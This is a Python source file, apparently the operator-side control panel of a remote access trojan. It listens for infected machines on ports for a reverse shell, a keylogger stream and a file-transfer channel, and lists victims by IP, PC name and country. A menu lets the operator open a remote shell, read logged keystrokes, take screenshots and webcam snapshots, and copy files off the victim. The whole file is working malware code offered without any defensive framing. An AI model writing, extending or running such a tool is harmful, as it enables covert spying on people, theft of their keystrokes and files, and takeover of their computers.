import io
import json
import socket
import threading

import  random

from terminal_ui import TerminalWindow as Ui_MainWindow2

from treeview import FileManagerServer
from keylog_ui import  MainWindow as Ui_KeylogWindow
from PyQt6 import QtCore, QtWidgets
from PyQt6.QtCore import QPoint
from PyQt6.QtWidgets import QApplication, QMainWindow, QTableWidgetItem, QTableWidget, QPushButton, QMenu

SERVER_HOST = socket.gethostbyname(socket.gethostname())
SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
SERVER_PORT_MANAGE_FILE = 5050
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
# create a socket object
s1 = socket.socket()
s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s1.bind((SERVER_HOST,SERVER_PORT_SHELL))
s1.listen(5)

s2 = socket.socket()
s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s2.bind((SERVER_HOST,SERVER_PORT_KEYLOGGER))
s2.listen(5)

s3 = socket.socket()
s3.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s3.bind((SERVER_HOST,SERVER_PORT_MANAGE_FILE))
s3.listen(5)





def reverse_shell(s1):
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
    socket, client_add = s1.accept()
    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
    cwd = socket.recv(BUFFER_SIZE).decode()
    ui.second_window.print_text(f"{cwd} $>")
    ui.second_window.socket = socket
    infor = socket.recv(BUFFER_SIZE).decode()
    print(infor)
    list_infor = infor.split(SEPARATOR)
    ui.add_row(list_infor[0],list_infor[1],list_infor[2])
    ui.keylog_window.setWindowTitle(list_infor[1] + "@KeyLog")
    ui.keylog_window.filename = list_infor[1] + '.txt'

def key_logger(s2):
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
    socket, client_add = s2.accept()
    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
    while True:
        output = socket.recv(BUFFER_SIZE).decode()
        str1, str2 = output.split(SEPARATOR)
        with open(f'{str1}.txt', "a",encoding='utf-8') as file:
            try:
                file.write(f"{str2}\n")
                ui.keylog_window.addLine(str2)
            except Exception as e:
                print(f"Error logging key: {e}")
def manage_file(s3):
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
    socket, client_add = s3.accept()
    ui.manage_file_window.socket = socket
    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
    data = b""
    while True:
        chunk = socket.recv(4096)
        if b"<end>" in chunk:
            data += chunk.split(b"<end>")[0]
            break
        data += chunk

    try:
        directory_tree = json.loads(data.decode())
        ui.manage_file_window.populate_tree_view(directory_tree)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON: {e}")

    while True:
        file_name_length = socket.recv(4)  # Expecting the length of the file name
        if not file_name_length:
            return

        file_name_length = int.from_bytes(file_name_length, 'big')  # Convert bytes to int
        filename = "copy_" + str(random.randint(1,1000)) + "_" + socket.recv(file_name_length).decode()
        try:
                print(f"Copy file {filename}")
                with open(filename, 'wb') as f:
                    while True:
                        data = socket.recv(BUFFER_SIZE)
                        if b"<end>" in chunk:
                            f.write(data.split(b"<end>")[0])
                            break
                        f.write(data)
        except OSError as e:
            print("")



class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1000, 800)
        self.centralwidget = QtWidgets.QWidget(parent=MainWindow)
        self.centralwidget.setObjectName("centralwidget")

        self.tableWidget = QtWidgets.QTableWidget(parent=self.centralwidget)
        self.tableWidget.setGeometry(QtCore.QRect(0, 40, 1000, 600))
        self.tableWidget.setMinimumSize(QtCore.QSize(300, 0))
        self.tableWidget.setRowCount(0)
        self.tableWidget.setColumnCount(4)
        self.tableWidget.setObjectName("tableWidget")

        # Set headers
        self.tableWidget.setHorizontalHeaderItem(0, QTableWidgetItem("IP Address"))
        self.tableWidget.setHorizontalHeaderItem(1, QTableWidgetItem("PC"))
        self.tableWidget.setHorizontalHeaderItem(2, QTableWidgetItem("Country"))
        self.tableWidget.setHorizontalHeaderItem(3, QTableWidgetItem("Status"))

        # Set column widths
        self.tableWidget.setColumnWidth(0, 250)
        self.tableWidget.setColumnWidth(1, 250)
        self.tableWidget.setColumnWidth(2, 250)
        self.tableWidget.setColumnWidth(3, 230)



        # Enable custom context menu
        self.tableWidget.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.CustomContextMenu)

        # Connect right-click signal to the custom slot
        self.tableWidget.customContextMenuRequested.connect(self.onRightClick)
        self.second_window = Ui_MainWindow2()
        self.manage_file_window = FileManagerServer()
        # self.keylog_window = None
        self.keylog_window = Ui_KeylogWindow()
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 21))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(parent=MainWindow)
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))

    def add_row(self, ip="", pc="", country="", status="connected"):
        # Add a new row to the table
        rowPosition = self.tableWidget.rowCount()
        self.tableWidget.insertRow(rowPosition)
        self.tableWidget.setItem(rowPosition, 0, QTableWidgetItem(ip))
        self.tableWidget.setItem(rowPosition, 1, QTableWidgetItem(pc))
        self.tableWidget.setItem(rowPosition, 2, QTableWidgetItem(country))
        self.tableWidget.setItem(rowPosition, 3, QTableWidgetItem(status))

    def onRightClick(self, position: QPoint):
        # Find the row that was clicked
        row = self.tableWidget.rowAt(position.y())

        if row != -1:  # Make sure a valid row is clicked
            print(f"Right-clicked on row {row}")

            # Create the context menu
            contextMenu = QMenu(self.tableWidget)

            # Add actions to the menu
            remoteShell = contextMenu.addAction("Remote shell")
            keylog = contextMenu.addAction("Keylog file")
            screenShot = contextMenu.addAction("Screen shot")
            webCam = contextMenu.addAction("Webcam snapshot")
            showDir = contextMenu.addAction("Show directory")

            # Execute the context menu and get the selected action
            action = contextMenu.exec(self.tableWidget.mapToGlobal(position))

            # Handle the selected action
            if action == remoteShell:
                self.second_window.show()
            elif action == keylog:
                ui.keylog_window.readfile()
                ui.keylog_window.show()
            elif action == screenShot:
                # self.srceen_shot()
                ui.second_window.screen_shot("src")
            elif action == webCam:
                ui.second_window.screen_shot("webcam")
            elif action == showDir:
                ui.manage_file_window.show()

    def processInput(self, text):
        # Process the user input
        print(f"User entered: {text}")  # Handle the input as needed
        self.textEdit.append(f"Output: {text}")  # Example output




t1 = threading.Thread(target=reverse_shell, args=(s1,))
t2 = threading.Thread(target=key_logger, args=(s2,))
t3 = threading.Thread(target=manage_file, args=(s3,))
t1.start()
t2.start()
t3.start()

import sys
app = QtWidgets.QApplication(sys.argv)
MainWindow = QtWidgets.QMainWindow()
ui = Ui_MainWindow()
ui.setupUi(MainWindow)
MainWindow.show()
sys.exit(app.exec())



